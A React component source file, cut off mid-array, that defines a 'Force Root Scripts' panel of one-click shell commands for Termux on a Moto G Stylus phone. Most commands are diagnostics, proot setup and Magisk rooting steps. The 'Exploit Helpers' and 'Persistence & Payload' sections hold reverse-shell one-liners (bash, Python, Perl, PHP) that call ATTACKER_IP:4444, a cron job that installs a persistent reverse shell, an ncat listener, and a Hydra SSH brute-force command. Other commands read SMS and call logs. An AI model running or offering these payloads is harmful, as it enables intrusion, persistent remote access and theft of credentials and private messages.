import React, { useState, useCallback } from 'react';
import {
  Shield, Copy, Check, Play, Terminal, AlertTriangle,
  Smartphone, HardDrive, Wifi, Lock, Eye, Radio,
  Cpu, Globe, ChevronDown, ChevronUp, Zap, Download,
  Info, RotateCw
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { cn } from '../lib/utils';

interface ForceRootScriptsProps {
  onExecute: (cmd: string) => Promise<string | null>;
  onRunInTerminal: (cmd: string) => void;
}

interface RootScript {
  name: string;
  desc: string;
  command: string;
  category: string;
  risk: 'LOW' | 'MEDIUM' | 'HIGH' | 'INFO';
  notes?: string;
}

const FORCE_ROOT_SCRIPTS: RootScript[] = [
  // PROOT & DISTRO
  { name: 'Install Proot-Distro', desc: 'Install proot-distro for fake root Linux environment', command: 'pkg install -y proot-distro', category: 'Proot & Distro', risk: 'LOW' },
  { name: 'Install Ubuntu Proot', desc: 'Full Ubuntu 22.04 in proot (fake root access)', command: 'proot-distro install ubuntu', category: 'Proot & Distro', risk: 'LOW' },
  { name: 'Login Ubuntu Root', desc: 'Enter Ubuntu with root-like access', command: 'proot-distro login ubuntu --shared-tmp', category: 'Proot & Distro', risk: 'LOW' },
  { name: 'Install Debian Proot', desc: 'Debian 12 bookworm in proot', command: 'proot-distro install debian', category: 'Proot & Distro', risk: 'LOW' },
  { name: 'Install Kali Proot', desc: 'Kali Linux in proot (full tool suite)', command: 'proot-distro install kali-rolling', category: 'Proot & Distro', risk: 'MEDIUM', notes: 'Large download ~1.5GB' },
  { name: 'List Distros', desc: 'Show installed proot distributions', command: 'proot-distro list', category: 'Proot & Distro', risk: 'INFO' },
  { name: 'Remove Distro', desc: 'Remove a proot distribution (replace DISTRO)', command: 'proot-distro remove ubuntu', category: 'Proot & Distro', risk: 'HIGH', notes: 'Replace ubuntu with target distro' },

  // ADB ACCESS
  { name: 'Install ADB', desc: 'Android Debug Bridge for device-level access', command: 'pkg install -y android-tools', category: 'ADB Access', risk: 'LOW' },
  { name: 'ADB Devices', desc: 'List connected ADB devices', command: 'adb devices', category: 'ADB Access', risk: 'INFO' },
  { name: 'ADB Shell', desc: 'Drop into ADB shell (system-level)', command: 'adb shell', category: 'ADB Access', risk: 'MEDIUM' },
  { name: 'ADB WiFi Connect', desc: 'Connect ADB over WiFi (replace IP)', command: 'adb connect 192.168.1.1:5555', category: 'ADB Access', risk: 'LOW', notes: 'Enable wireless debugging in Developer Options first' },
  { name: 'ADB List Packages', desc: 'Dump all installed packages', command: 'adb shell pm list packages', category: 'ADB Access', risk: 'INFO' },
  { name: 'ADB Dump Package Info', desc: 'Get full info on a package (replace PKG)', command: 'adb shell dumpsys package com.android.chrome', category: 'ADB Access', risk: 'INFO', notes: 'Replace com.android.chrome with target package' },
  { name: 'ADB Force Stop', desc: 'Force-stop an app (replace PKG)', command: 'adb shell am force-stop com.android.chrome', category: 'ADB Access', risk: 'MEDIUM' },
  { name: 'ADB Clear App Data', desc: 'Wipe app storage (replace PKG)', command: 'adb shell pm clear com.android.chrome', category: 'ADB Access', risk: 'HIGH', notes: 'Destroys all app data' },
  { name: 'ADB Screenshot', desc: 'Capture device screenshot to Termux', command: 'adb exec-out screencap -p > /sdcard/screenshot.png', category: 'ADB Access', risk: 'LOW' },
  { name: 'ADB Screen Record', desc: 'Record screen (30s max, saves to SD)', command: 'adb shell screenrecord --time-limit 30 /sdcard/record.mp4', category: 'ADB Access', risk: 'LOW' },
  { name: 'ADB Logcat', desc: 'Live system log stream', command: 'adb logcat -d | tail -100', category: 'ADB Access', risk: 'INFO' },

  // TERMUX:API
  { name: 'Install Termux:API', desc: 'System API access (battery, sensors, clipboard)', command: 'pkg install -y termux-api', category: 'Termux:API', risk: 'LOW', notes: 'Also install Termux:API app from F-Droid' },
  { name: 'Battery Status', desc: 'Full battery info via Termux:API', command: 'termux-battery-status', category: 'Termux:API', risk: 'INFO' },
  { name: 'Clipboard Get', desc: 'Read system clipboard', command: 'termux-clipboard-get', category: 'Termux:API', risk: 'LOW' },
  { name: 'Clipboard Set', desc: 'Write to system clipboard', command: 'echo "data" | termux-clipboard-set', category: 'Termux:API', risk: 'LOW' },
  { name: 'Vibrate Device', desc: 'Test haptic feedback', command: 'termux-vibrate -d 500', category: 'Termux:API', risk: 'LOW' },
  { name: 'Show Notification', desc: 'Push system notification', command: 'termux-notification --title "Nex.AI" --content "Scan Complete" --id 1', category: 'Termux:API', risk: 'LOW' },
  { name: 'Flash LED', desc: 'Toggle flashlight', command: 'termux-torch on', category: 'Termux:API', risk: 'LOW' },
  { name: 'Share File', desc: 'Share file via Android share sheet', command: 'termux-share -a send /sdcard/file.txt', category: 'Termux:API', risk: 'LOW' },
  { name: 'Sensor List', desc: 'List all device sensors', command: 'termux-sensor-list', category: 'Termux:API', risk: 'INFO' },
  { name: 'Read Sensors', desc: 'Read accelerometer + gyroscope (5 samples)', command: 'termux-sensor -s accel,gyro -n 5 2>/dev/null', category: 'Termux:API', risk: 'INFO' },
  { name: 'Get Location', desc: 'GPS coordinates via Termux:API', command: 'termux-location -p network', category: 'Termux:API', risk: 'LOW' },
  { name: 'Device Info', desc: 'Full device hardware info dump', command: 'termux-info 2>/dev/null; echo "---"; getprop ro.product.model; getprop ro.build.version.release; getprop ro.product.cpu.abi; uname -a', category: 'Termux:API', risk: 'INFO' },
  { name: 'Call Log', desc: 'Read recent call history', command: 'termux-call-log -l 20 2>/dev/null', category: 'Termux:API', risk: 'MEDIUM', notes: 'Requires CALL_LOG permission' },
  { name: 'SMS Inbox', desc: 'Read recent SMS messages', command: 'termux-sms-list -l 10 2>/dev/null', category: 'Termux:API', risk: 'MEDIUM', notes: 'Requires SMS permission' },
  { name: 'Send SMS', desc: 'Send SMS (replace NUMBER and MSG)', command: 'termux-sms-send -n 5551234567 "Test from Nex.AI" 2>/dev/null', category: 'Termux:API', risk: 'HIGH', notes: 'Replace number and message' },

  // STORAGE
  { name: 'Setup Storage Access', desc: 'Grant Termux access to shared storage', command: 'termux-setup-storage', category: 'Storage Hacks', risk: 'LOW' },
  { name: 'List Storage', desc: 'List all accessible storage paths', command: 'ls -la ~/storage/ 2>/dev/null; echo "---"; df -h /data/data/com.termux/files; df -h /sdcard 2>/dev/null', category: 'Storage Hacks', risk: 'INFO' },
  { name: 'Mount Bind External', desc: 'Bind-mount SD card to Termux home', command: 'ln -sf /sdcard ~/sdcard 2>/dev/null; ls ~/sdcard/ | head -20', category: 'Storage Hacks', risk: 'LOW' },
  { name: 'Disk Usage Deep', desc: 'Full disk usage analysis', command: 'du -sh /data/data/com.termux/files/* 2>/dev/null | sort -rh | head -20', category: 'Storage Hacks', risk: 'INFO' },
  { name: 'Storage Cleanup', desc: 'Clean Termux cache and temp files', command: 'pkg clean 2>/dev/null; rm -rf $PREFIX/var/cache/apt/archives/*.deb 2>/dev/null; rm -rf $TMPDIR/* 2>/dev/null; echo "Cleaned."', category: 'Storage Hacks', risk: 'LOW' },

  // NETWORK
  { name: 'WiFi Info', desc: 'Current WiFi connection details', command: 'termux-wifi-connectioninfo 2>/dev/null; echo "---"; ip addr show wlan0 2>/dev/null', category: 'Network Force', risk: 'INFO' },
  { name: 'WiFi Scan', desc: 'Scan nearby WiFi networks', command: 'termux-wifi-scaninfo 2>/dev/null | head -50', category: 'Network Force', risk: 'INFO' },
  { name: 'List Network Interfaces', desc: 'All network interfaces with IPs', command: 'ip -br -c -4 addr 2>/dev/null; echo "---"; ip -br -c -6 addr 2>/dev/null', category: 'Network Force', risk: 'INFO' },
  { name: 'ARP Table', desc: 'Show ARP cache (LAN device map)', command: 'ip neigh show 2>/dev/null; echo "---"; arp -a 2>/dev/null', category: 'Network Force', risk: 'INFO' },
  { name: 'Port Scan Local', desc: 'Check open ports on localhost', command: 'ss -tlnp 2>/dev/null; echo "---"; netstat -tlnp 2>/dev/null', category: 'Network Force', risk: 'INFO' },
  { name: 'DNS Resolver Test', desc: 'Test DNS resolution speed', command: 'echo "Testing DNS..."; time nslookup google.com 2>/dev/null; echo "---"; cat /etc/resolv.conf 2>/dev/null', category: 'Network Force', risk: 'INFO' },
  { name: 'Network Stats', desc: 'Network interface statistics', command: 'ip -s link show 2>/dev/null; echo "---"; cat /proc/net/dev 2>/dev/null', category: 'Network Force', risk: 'INFO' },

  // PROCESS & SYSTEM
  { name: 'List All Processes', desc: 'Every running process on device', command: 'ps aux 2>/dev/null || ps -ef 2>/dev/null; echo "---"; top -b -n 1 2>/dev/null | head -20', category: 'Process & System', risk: 'INFO' },
  { name: 'CPU Info', desc: 'Full CPU architecture details', command: 'cat /proc/cpuinfo 2>/dev/null | head -30; echo "---"; lscpu 2>/dev/null', category: 'Process & System', risk: 'INFO' },
  { name: 'Memory Info', desc: 'RAM usage breakdown', command: 'free -h 2>/dev/null; echo "---"; cat /proc/meminfo 2>/dev/null | head -15', category: 'Process & System', risk: 'INFO' },
  { name: 'Uptime & Load', desc: 'System uptime and load averages', command: 'uptime; echo "---"; cat /proc/loadavg 2>/dev/null; echo "---"; whoami; id', category: 'Process & System', risk: 'INFO' },
  { name: 'Kill Process by Name', desc: 'Kill all processes matching name (replace NAME)', command: 'pkill -f "NAME" 2>/dev/null || echo "No match found"', category: 'Process & System', risk: 'MEDIUM', notes: 'Replace NAME with target process' },
  { name: 'Background Process', desc: 'Run command in background with nohup', command: 'nohup nmap -sS 192.168.1.0/24 > ~/scan.log 2>&1 &; echo "PID: $!"', category: 'Process & System', risk: 'LOW' },
  { name: 'Cron Job Setup', desc: 'Install and configure cron daemon', command: 'pkg install -y cronie 2>/dev/null; echo "0 * * * * ~/scripts/check.sh" | crontab - 2>/dev/null; crontab -l 2>/dev/null', category: 'Process & System', risk: 'LOW' },

  // SECURITY ENUM
  { name: 'SELinux Status', desc: 'Check SELinux enforcement mode', command: 'getenforce 2>/dev/null || echo "No getenforce"; getprop ro.build.selinux 2>/dev/null; cat /sys/fs/selinux/enforce 2>/dev/null', category: 'Security Enum', risk: 'INFO' },
  { name: 'App Ops List', desc: 'List app operation permissions via ADB', command: 'adb shell appops list 2>/dev/null | head -50', category: 'Security Enum', risk: 'INFO' },
  { name: 'List Installed APKs', desc: 'All third-party installed apps', command: 'adb shell pm list packages -3 2>/dev/null', category: 'Security Enum', risk: 'INFO' },
  { name: 'List System APKs', desc: 'All pre-installed system apps', command: 'adb shell pm list packages -s 2>/dev/null | head -50', category: 'Security Enum', risk: 'INFO' },
  { name: 'App Permissions Dump', desc: 'Dump permissions for an app (replace PKG)', command: 'adb shell dumpsys package com.android.chrome | grep -A 30 "granted=true" 2>/dev/null', category: 'Security Enum', risk: 'INFO' },
  { name: 'Device Properties', desc: 'Dump all Android system properties', command: 'getprop 2>/dev/null | head -60', category: 'Security Enum', risk: 'INFO' },

  // MOTO G STYLUS SPECIFIC
  { name: 'Moto G - Device ID', desc: 'Moto G Stylus 5G 2024 hardware identifiers', command: 'echo "=== DEVICE ==="; getprop ro.product.model; getprop ro.product.brand; getprop ro.product.device; getprop ro.product.name; echo "=== BOARD ==="; getprop ro.product.board; getprop ro.hardware; echo "=== BUILD ==="; getprop ro.build.id; getprop ro.build.display.id; getprop ro.build.fingerprint', category: 'Moto G Stylus', risk: 'INFO' },
  { name: 'Moto G - Storage Layout', desc: 'Partition layout for Moto G Stylus 5G 2024', command: 'ls -la /dev/block/by-name/ 2>/dev/null | head -20; echo "---"; df -h; echo "---"; mount | grep -E "(/system|/data|/vendor|/product)" 2>/dev/null', category: 'Moto G Stylus', risk: 'INFO' },
  { name: 'Moto G - Boot Info', desc: 'Bootloader and kernel details', command: 'echo "=== BOOTLOADER ==="; getprop ro.boot.bootloader; getprop ro.boot.verifiedbootstate; getprop ro.boot.veritymode; echo "=== KERNEL ==="; uname -a; cat /proc/version', category: 'Moto G Stylus', risk: 'INFO' },
  { name: 'Moto G - Android Version', desc: 'Android version and security patch level', command: 'getprop ro.build.version.release; getprop ro.build.version.sdk; getprop ro.build.version.security_patch; getprop ro.build.version.incremental', category: 'Moto G Stylus', risk: 'INFO' },
  { name: 'Moto G - Hardware Specs', desc: 'CPU, GPU, display, and RAM specs', command: 'echo "=== CPU ==="; cat /proc/cpuinfo | grep -E "Hardware|Processor|model name" | head -5; echo "=== DISPLAY ==="; wm size 2>/dev/null; wm density 2>/dev/null; echo "=== RAM ==="; free -h; echo "=== STORAGE ==="; df -h /data', category: 'Moto G Stylus', risk: 'INFO' },
  { name: 'Moto G - Network Bands', desc: 'Cellular bands and SIM info', command: 'getprop gsm.operator.alpha; getprop gsm.sim.operator.alpha; getprop gsm.operator.numeric; getprop persist.radio.multisim.config 2>/dev/null', category: 'Moto G Stylus', risk: 'INFO' },
  { name: 'Moto G - Stylus API', desc: 'Moto Stylus pen event support check', command: 'getprop ro.vendor.build.hwrevision 2>/dev/null; dumpsys input 2>/dev/null | grep -i "stylus|pen|touch" | head -10; echo "---"; getevent -lp 2>/dev/null | head -30', category: 'Moto G Stylus', risk: 'INFO' },
  { name: 'Moto G - Battery Deep', desc: 'Battery health, temp, and charging details', command: 'termux-battery-status 2>/dev/null; echo "---"; dumpsys battery 2>/dev/null; echo "---"; cat /sys/class/power_supply/battery/capacity 2>/dev/null; cat /sys/class/power_supply/battery/health 2>/dev/null; cat /sys/class/power_supply/battery/status 2>/dev/null; cat /sys/class/power_supply/battery/temp 2>/dev/null', category: 'Moto G Stylus', risk: 'INFO' },

  // EXPLOIT HELPERS
  { name: 'Proot Nmap Scan', desc: 'Run nmap inside proot (gets raw socket access)', command: 'proot-distro login ubuntu --shared-tmp -- bash -c "apt update -qq && apt install -y -qq nmap > /dev/null 2>&1 && nmap -sV 192.168.1.1"', category: 'Exploit Helpers', risk: 'MEDIUM' },
  { name: 'Proot Ncat Listener', desc: 'Start ncat listener inside proot', command: 'proot-distro login ubuntu --shared-tmp -- bash -c "apt install -y -qq ncat > /dev/null 2>&1 && ncat -lvnp 4444"', category: 'Exploit Helpers', risk: 'MEDIUM' },
  { name: 'Proot Python Server', desc: 'HTTP server for file transfer in proot', command: 'proot-distro login ubuntu --shared-tmp -- bash -c "python3 -m http.server 8080 --bind 0.0.0.0"', category: 'Exploit Helpers', risk: 'LOW' },
  { name: 'Proot Hydra', desc: 'Run hydra inside proot with full capabilities', command: 'proot-distro login ubuntu --shared-tmp -- bash -c "apt install -y -qq hydra > /dev/null 2>&1 && hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh -t 4"', category: 'Exploit Helpers', risk: 'HIGH' },
  { name: 'Reverse Shell Template', desc: 'Generate reverse shell one-liners', command: 'echo "# Bash TCP Reverse Shell" && echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" && echo "" && echo "# Python Reverse Shell" && echo "python3 -c \'import socket,subprocess,os;...\'" && echo "" && echo "# Replace ATTACKER_IP with your IP"', category: 'Exploit Helpers', risk: 'HIGH' },

  // ═══════════════════════════════════════════
  // MAGISK & ROOT
  // ═══════════════════════════════════════════
  { name: 'Download Magisk APK', desc: 'Download latest Magisk APK for boot image patching', command: 'curl -L -o /sdcard/Download/Magisk.apk https://github.com/topjohnwu/Magisk/releases/latest/download/Magisk-v27.0.apk 2>/dev/null && echo "Downloaded to /sdcard/Download/Magisk.apk" || echo "Download failed - check URL"', category: 'Magisk & Root', risk: 'LOW' },
  { name: 'Magisk Boot Patch', desc: 'Patch boot image with Magisk (requires boot.img in Downloads)', command: 'ls -la /sdcard/Download/boot*.img 2>/dev/null && echo "Boot image found. Use Magisk Manager app to patch." || echo "No boot.img found. Extract first: adb shell dd if=/dev/block/by-name/boot of=/sdcard/Download/boot.img"', category: 'Magisk & Root', risk: 'MEDIUM' },
  { name: 'Check Magisk Status', desc: 'Check if Magisk is installed and its version', command: 'magisk -v 2>/dev/null && magisk --path 2>/dev/null && echo "---" && ls -la /data/adb/magisk/ 2>/dev/null || echo "Magisk not installed"', category: 'Magisk & Root', risk: 'INFO' },
  { name: 'Magisk Modules List', desc: 'List all installed Magisk modules', command: 'ls -la /data/adb/modules/ 2>/dev/null && echo "---MODULES---" && for m in /data/adb/modules/*/; do echo "$(basename $m): $(cat $m/module.prop 2>/dev/null | grep version | cut -d= -f2)"; done || echo "No modules or Magisk not installed"', category: 'Magisk & Root', risk: 'INFO' },

  // ═══════════════════════════════════════════
  // KERNEL & BOOT
  // ═══════════════════════════════════════════
  { name: 'Extract Boot Image', desc: 'Dump boot partition via ADB for Magisk patching', command: 'adb shell "dd if=/dev/block/by-name/boot of=/sdcard/Download/boot.img" 2>/dev/null && adb pull /sdcard/Download/boot.img ~/boot.img 2>/dev/null && echo "Boot image extracted" || echo "Failed - ensure ADB connected and authorized"', category: 'Kernel & Boot', risk: 'MEDIUM' },
  { name: 'Flash Patched Boot', desc: 'Flash Magisk-patched boot.img via fastboot', command: 'echo "=== FASTBOOT FLASH BOOT ===" && echo "1. Reboot to fastboot: adb reboot bootloader" && echo "2. Flash: fastboot flash boot /sdcard/Download/magisk_patched.img" && echo "3. Reboot: fastboot reboot" && echo "" && echo "WARNING: This modifies the boot partition!"', category: 'Kernel & Boot', risk: 'HIGH', notes: 'Bootloader must be unlocked first' },
  { name: 'Get Bootloader Status', desc: 'Check if bootloader is locked or unlocked', command: 'getprop ro.boot.flash.locked && getprop ro.boot.verifiedbootstate && getprop ro.boot.vbmeta.device_state 2>/dev/null && echo "---" && getprop ro.secure && getprop ro.debuggable', category: 'Kernel & Boot', risk: 'INFO' },
  { name: 'Fastboot OEM Unlock', desc: 'OEM unlock bootloader (erases all data!)', command: 'echo "=== WARNING: THIS WIPES ALL DATA ===" && echo "Prerequisites:" && echo "1. Enable OEM unlock in Developer Options" && echo "2. Get unlock code from Motorola\'s website" && echo "3. Boot to fastboot: adb reboot bootloader" && echo "4. Run: fastboot flashing unlock" && echo "5. Confirm on device" && echo "" && fastboot flashing unlock 2>/dev/null || echo "Not in fastboot mode. Run: adb reboot bootloader"', category: 'Kernel & Boot', risk: 'HIGH', notes: 'WIPES ALL DATA. Get unlock code from Motorola first!' },

  // ═══════════════════════════════════════════
  // NETWORK ATTACKS
  // ═══════════════════════════════════════════
  { name: 'Install Network Tools', desc: 'Full network pentesting toolkit', command: 'pkg install -y nmap netcat-openbsd hydra sqlmap nikto bind-tools openssh tcpdump 2>/dev/null && echo "Network tools installed successfully"', category: 'Network Attacks', risk: 'LOW' },
  { name: 'Network Scan (Full)', desc: 'Full port scan of local network', command: 'echo "Scanning local network..." && ip addr show wlan0 2>/dev/null | grep "inet " && echo "---" && nmap -sV -O 192.168.1.1/24 --top-ports 100 2>/dev/null || echo "Install nmap: pkg install nmap"', category: 'Network Attacks', risk: 'LOW' },
  { name: 'SSL/TLS Scanner', desc: 'Check SSL certificate and configuration', command: 'echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -noout -dates -issuer -subject 2>/dev/null && echo "---" && echo | openssl s_client -connect google.com:443 2>/dev/null | grep "Protocol\\|Cipher" | head -5', category: 'Network Attacks', risk: 'INFO' },
  { name: 'Port Forwarding Setup', desc: 'Setup SSH tunnel and port forwarding', command: 'echo "=== PORT FORWARDING ===" && echo "Local:  ssh -L 8080:target:80 user@server" && echo "Remote: ssh -R 8080:localhost:80 user@server" && echo "Dynamic: ssh -D 9050 user@server" && echo "SOCKS:  ssh -D 1080 -N -f user@server"', category: 'Network Attacks', risk: 'MEDIUM' },

  // ═══════════════════════════════════════════
  // RECON & OSINT
  // ═══════════════════════════════════════════
  { name: 'Full Device Recon', desc: 'Complete device information dump for exploit research', command: 'echo "=== MOTO G STYLUS 5G 2024 RECON ===" && echo "=== DEVICE ===" && getprop ro.product.model && getprop ro.product.brand && getprop ro.product.device && getprop ro.product.name && getprop ro.product.board && echo "=== ANDROID ===" && getprop ro.build.version.release && getprop ro.build.version.sdk && getprop ro.build.version.security_patch && getprop ro.build.fingerprint && echo "=== HARDWARE ===" && cat /proc/cpuinfo | head -10 && echo "=== KERNEL ===" && uname -a && cat /proc/version && echo "=== MEMORY ===" && free -h && echo "=== STORAGE ===" && df -h && echo "=== SECURITY ===" && getenforce 2>/dev/null && getprop ro.secure && echo "=== NETWORK ===" && ip -br addr && echo "=== DONE ==="', category: 'Recon & OSINT', risk: 'INFO' },
  { name: 'Subdomain Enum', desc: 'Enumerate subdomains for a target domain', command: 'echo "Usage: Replace example.com" && echo "---" && for sub in www mail ftp admin api dev staging test vpn ns1 ns2 mx mx1 mx2 remote cloud cdn static media img assets app m mobile shop store blog forum wiki docs support help portal auth sso login signin register signup dashboard panel manage admin api v1 v2 v3 internal corp enterprise; do host $sub.example.com 2>/dev/null | grep "has address" && echo "FOUND: $sub.example.com"; done', category: 'Recon & OSINT', risk: 'INFO' },
  { name: 'Whois Lookup', desc: 'Domain registration and ownership info', command: 'pkg install -y whois 2>/dev/null; whois google.com 2>/dev/null | grep -E " Registrant| Name:| Org| Creation| Expiry| Name Server| DNS" | head -20', category: 'Recon & OSINT', risk: 'INFO' },
  { name: 'HTTP Header Analysis', desc: 'Analyze HTTP response headers for security issues', command: 'curl -sI -L https://example.com 2>/dev/null | head -30', category: 'Recon & OSINT', risk: 'INFO' },

  // ═══════════════════════════════════════════
  // PERSISTENCE & PAYLOAD
  // ═══════════════════════════════════════════
  { name: 'Reverse Shell Generator', desc: 'Generate multiple reverse shell one-liners', command: 'echo "=== REVERSE SHELLS (replace ATTACKER_IP:PORT) ===" && echo "" && echo "# BASH" && echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" && echo "" && echo "# PYTHON" && echo "python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect((\\\"ATTACKER_IP\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])\'" && echo "" && echo "# PERL" && echo "perl -e \'use Socket;$i=\\\"ATTACKER_IP\\\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/bash -i\\\");\'" && echo "" && echo "# PHP" && echo "php -r \'$s=fsockopen(\\\"ATTACKER_IP\\\",4444);exec(\\\"/bin/bash -i <&3 >&3 2>&3\\\");\'"', category: 'Persistence & Payload', risk: 'HIGH', notes: 'Replace ATTACKER_IP and PORT with your values' },
  { name: 'Cron Persistence', desc: 'Setup persistent reverse shell via cron', command: 'pkg install -y cronie 2>/dev/null && echo "*/5 * * * * bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\'" | crontab - 2>/dev/null && crontab -l 2>/dev/null && echo "Persistent cron shell installed (every 5 min)"', category: 'Persistence & Payload', risk: 'HIGH', notes: 'Replace ATTACKER_IP:PORT. Needs proot for raw sockets' },
  { name: 'SSH Key Setup', desc: 'Generate SSH keys and setup for remote access', command: 'pkg install -y openssh 2>/dev/null && ssh-keygen -t ed25519 -C "nexai@termux" -f ~/.ssh/id_ed25519 -N "" 2>/dev/null && echo "=== SSH KEY GENERATED ===" && cat ~/.ssh/id_ed25519.pub && echo "" && echo "Copy this public key to remote:~/.ssh/authorized_keys"', category: 'Persistence & Payload', risk: 'LOW' },
  { name: 'Proot Persistence Service', desc: 'Create persistent proot service that survives Termux restarts', command: 'mkdir -p ~/.shortcuts/tasks && echo "#!/data/data/com.termux/files/usr/bin/sh" > ~/.shortcuts/tasks/proot-ubuntu.sh && echo "proot-distro login ubuntu --shared-tmp -- bash -c \'service ssh start && nginx && python3 -m http.server 8080\'" >> ~/.shortcuts/tasks/proot-ubuntu.sh && chmod +x ~/.shortcuts/tasks/proot-ubuntu.sh && echo "Persistent task created. Access from Termux Widget or notification."', category: 'Persistence & Payload', risk: 'LOW' },
];

const CATEGORIES = [...new Set(FORCE_ROOT_SCRIPTS.map(s => s.category))];

const CATEGORY_ICONS: Record<string, React.ReactNode> = {
  'Proot & Distro': <HardDrive size={12} />,
  'ADB Access': <Smartphone size={12} />,
  'Termux:API': <Zap size={12} />,
  'Storage Hacks': <Download size={12} />,
  'Network Force': <Globe size={12} />,
  'Process & System': <Cpu size={12} />,
  'Security Enum': <Eye size={12} />,
  'Moto G Stylus': <Radio size={12} />,
  'Exploit Helpers': <Lock size={12} />,
  'Magisk & Root': <Shield size={12} />,
  'Kernel & Boot': <Cpu size={12} />,
  'Network Attacks': <Wifi size={12} />,
  'Recon & OSINT': <Globe size={12} />,
  'Persistence & Payload': <Lock size={12} />,
};

const CATEGORY_COLORS: Record<string, string> = {
  'Proot & Distro': 'from-blue-500 to-indigo-600',
  'ADB Access': 'from-green-500 to-emerald-600',
  'Termux:API': 'from-yellow-500 to-amber-600',
  'Storage Hacks': 'from-purple-500 to-violet-600',
  'Network Force': 'from-cyan-500 to-blue-600',
  'Process & System': 'from-orange-500 to-red-600',
  'Security Enum': 'from-red-600 to-pink-600',
  'Moto G Stylus': 'from-accent to-red-600',
  'Exploit Helpers': 'from-amber-500 to-orange-600',
  'Magisk & Root': 'from-red-500 to-rose-600',
  'Kernel & Boot': 'from-violet-500 to-purple-600',
  'Network Attacks': 'from-cyan-500 to-blue-600',
  'Recon & OSINT': 'from-teal-500 to-emerald-600',
  'Persistence & Payload': 'from-red-600 to-orange-600',
};

const RISK_COLORS: Record<string, string> = {
  'INFO': 'text-zinc-500 bg-zinc-900',
  'LOW': 'text-neon-green bg-neon-green/10 border-neon-green/20',
  'MEDIUM': 'text-amber-400 bg-amber-500/10 border-amber-500/20',
  'HIGH': 'text-red-400 bg-red-500/10 border-red-500/20',
};

type Tab = 'scripts' | 'one-click' | 'info';

interface OneClickScript {
  name: string;
  desc: string;
  command: string;
  risk: 'LOW' | 'MEDIUM' | 'HIGH' | 'INFO';
}

const ONE_CLICKS: OneClickScript[] = [
  { name: 'Full Proot Setup', desc: 'Install proot-distro + Ubuntu + essential tools', command: 'pkg install -y proot-distro && proot-distro install ubuntu && proot-distro login ubuntu --shared-tmp -- bash -c "apt update && apt install -y nmap curl wget git python3 python3-pip hydra nikto sqlmap netcat-openbsd binutils -y > /dev/null 2>&1 && echo SETUP COMPLETE"', risk: 'LOW' },
  { name: 'ADB Wireless Setup', desc: 'Install ADB and show connection instructions', command: 'pkg install -y android-tools && echo "=== ADB SETUP ===" && echo "1. Enable Developer Options on phone" && echo "2. Enable Wireless Debugging" && echo "3. Pair using: adb pair IP:PORT" && echo "4. Connect: adb connect IP:PORT" && adb devices', risk: 'LOW' },
  { name: 'Termux:API Full Install', desc: 'Install all Termux:API packages', command: 'pkg install -y termux-api && echo "Also install the Termux:API app from F-Droid" && echo "Test: termux-battery-status" && termux-battery-status 2>/dev/null', risk: 'LOW' },
  { name: 'Pentest Environment', desc: 'Full proot Kali + tools in one shot', command: 'pkg install -y proot-distro nmap && proot-distro install kali-rolling && proot-distro login kali-rolling --shared-tmp -- bash -c "apt update -qq && apt install -y -qq nmap sqlmap hydra nikto gobuster nuclei wordlists seclists curl wget git metasploit-framework > /dev/null 2>&1 && echo KALI PENTEST ENV READY"', risk: 'MEDIUM' },
  { name: 'Network Toolkit', desc: 'All network tools with proot raw sockets', command: 'pkg install -y nmap netcat-openbsd hydra sqlmap nikto bind-tools && echo "Network toolkit installed. Use proot for raw sockets."', risk: 'LOW' },
  { name: 'Storage Maximize', desc: 'Setup storage + cleanup + SD mount', command: 'termux-setup-storage && pkg clean 2>/dev/null && rm -rf $PREFIX/var/cache/apt/archives/*.deb 2>/dev/null && rm -rf $TMPDIR/* 2>/dev/null && ln -sf /sdcard ~/sdcard && echo "=== STORAGE MAXIMIZED ===" && df -h /data/data/com.termux/files', risk: 'LOW' },
  { name: 'System Recon Dump', desc: 'Dump everything about the Moto G Stylus', command: 'echo "=== MOTO G STYLUS 5G 2024 ===" && echo "=== DEVICE ===" && getprop ro.product.model && getprop ro.product.brand && echo "=== ANDROID ===" && getprop ro.build.version.release && getprop ro.build.version.security_patch && echo "=== HARDWARE ===" && cat /proc/cpuinfo | grep -E "Hardware|Processor" | head -3 && echo "=== RAM ===" && free -h && echo "=== NETWORK ===" && ip -br addr 2>/dev/null && echo "=== BATTERY ===" && termux-battery-status 2>/dev/null && echo "=== DONE ==="', risk: 'INFO' },
  { name: 'Cron Auto-Recon', desc: 'Set up hourly automated recon cron job', command: 'pkg install -y cronie nmap 2>/dev/null && mkdir -p ~/scripts && echo "#!/bin/bash" > ~/scripts/auto-recon.sh && echo "nmap -sn 192.168.1.0/24 -oN ~/recon-$(date +%Y%m%d-%H%M).log 2>/dev/null" >> ~/scripts/auto-recon.sh && chmod +x ~/scripts/auto-recon.sh && echo "0 * * * * ~/scripts/auto-recon.sh" | crontab - 2>/dev/null && echo "Cron installed. Runs hourly." && crontab -l', risk: 'LOW' },
  { name: 'Magisk Root Prep', desc: 'Full preparation for Magisk rooting — ADB, boot dump, download Magisk', command: 'echo "=== MAGISK ROOT PREPARATION ===" && pkg install -y android-tools && echo "Step 1: Getting bootloader status..." && getprop ro.boot.flash.locked && echo "Step 2: Extracting boot image..." && adb shell "dd if=/dev/block/by-name/boot of=/sdcard/Download/boot.img" 2>/dev/null && echo "Step 3: Download Magisk..." && curl -L -o /sdcard/Download/Magisk.apk "https://github.com/topjohnwu/Magisk/releases/latest/download/Magisk-v27.0.apk" 2>/dev/null && echo "=== READY ===" && echo "Next: Install Magisk.apk, use it to patch boot.img, then flash patched image."', risk: 'MEDIUM' },
